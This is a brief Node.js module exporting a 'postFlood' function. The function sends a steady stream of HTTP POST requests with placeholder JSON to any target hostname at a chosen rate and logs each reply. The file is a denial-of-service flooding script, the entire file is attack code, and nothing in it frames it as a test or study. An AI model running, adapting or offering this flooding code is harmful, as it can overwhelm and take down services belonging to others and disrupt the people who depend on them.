const http = require('http');

function postFlood(target, rateLimit, logOutput) {
    setInterval(() => {
        const postData = JSON.stringify({
            'key1': 'value1',
            'key2': 'value2'
        });

        const options = {
            hostname: target,
            port: 80,
            path: '/',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        const req = http.request(options, (res) => {
            res.on('data', (chunk) => {
                logOutput('Received: ' + chunk);
            });
        });

        req.on('error', (err) => {
            logOutput('Error: ' + err.message);
        });

        req.write(postData);
        req.end();
    }, 1000 / rateLimit);
}

module.exports = postFlood;
